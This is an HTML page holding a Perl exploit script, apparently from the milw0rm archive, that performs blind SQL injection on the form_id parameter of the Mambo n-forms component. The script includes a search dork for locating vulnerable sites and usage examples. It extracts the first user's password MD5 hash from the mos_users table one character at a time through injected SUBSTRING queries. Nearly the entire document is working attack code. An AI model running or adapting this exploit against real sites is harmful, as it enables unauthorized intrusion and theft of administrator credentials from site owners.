<html><head><title>Mambo Component n-form (form_id) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
system(&quot;Title Kosova Hackers Group by boom3rang&quot;); 
 print &quot; \n&quot;;
 print &quot; #######################################################################\n&quot;;
 print &quot;  #   Mambo Component n-form(form_id) Blind SQL Injection Exploit \n&quot;;
 print &quot;  # -----------------------------------------------------------\n&quot;;
 print &quot;  #   Author: boom3rang [www.khg-crew.ws] \n&quot;;
 print &quot;  #   Greetz: H!tmaN, KHG, chs, redc00de - Kosova Hackers Group\n&quot;;
 print &quot;  #   Site:   www.khg-crew.ws\n&quot;;
 print &quot;  # -----------------------------------------------------------\n&quot;;
 print &quot;  #   Dork :   inurl:option=com_n-forms form_id \n&quot;;
 print &quot;  #   Usage:   perl exploit.pl host path &lt;options&gt; \n&quot;;
 print &quot;  #   Example: perl exploit.pl www.host.com /path/ -a 3 \n&quot;;
 print &quot;  # -----------------------------------------------------------\n&quot;;
 print &quot;  #   Options: \n&quot;;
 print &quot;  #     -a   valid form id \n&quot;;
 print &quot; #######################################################################\n&quot;;
 exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $userid  = 1;
my $aid     = $ARGV[2];

my %options = ();
GetOptions(\%options, &quot;u=i&quot;, &quot;p=s&quot;, &quot;a=i&quot;);

print &quot;[~] Exploiting...\n&quot;;

if($options{&quot;u&quot;})
{
 $userid = $options{&quot;u&quot;};
}

if($options{&quot;a&quot;})
{
 $aid = $options{&quot;a&quot;};
}

syswrite(STDOUT, &quot;[~] MD5-Hash: &quot;, 14);

for(my $i = 1; $i &lt;= 32; $i++)
{
 my $f = 0;
 my $h = 48;
 while(!$f &amp;&amp; $h &lt;= 57)
 {
   if(istrue2($host, $path, $userid, $aid, $i, $h))
   {
     $f = 1;
     syswrite(STDOUT, chr($h), 1);
   }
   $h++;
 }
 if(!$f)
 {
   $h = 97;
   while(!$f &amp;&amp; $h &lt;= 122)
   {
     if(istrue2($host, $path, $userid, $aid, $i, $h))
     {
       $f = 1;
       syswrite(STDOUT, chr($h), 1);
     }
     $h++;
   }
 }
}

print &quot;\n[~] Exploiting done\n&quot;;

sub istrue2
{
 my $host  = shift;
 my $path  = shift;
 my $uid   = shift;
 my $aid   = shift;
 my $i     = shift;
 my $h     = shift;

 my $ua = LWP::UserAgent-&gt;new;
 my $query = &quot;http://&quot;.$host.$path.&quot;index.php?option=com_n-forms&amp;form_id=&quot;.$aid.&quot; and ascii(SUBSTRING((SELECT password FROM mos_users LIMIT 0,1),&quot;.$i.&quot;,1))=&quot;.$h.&quot;&quot;;

 if($options{&quot;p&quot;})
 {
   $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
 }

 my $resp = $ua-&gt;get($query);
 my $content = $resp-&gt;content;
 my $regexp = &quot;Back&quot;;

 if($content =~ /$regexp/)
 {
   return 1;
 }
 else
 {
   return 0;
 }

}

# milw0rm.com [2008-11-08]</pre></html>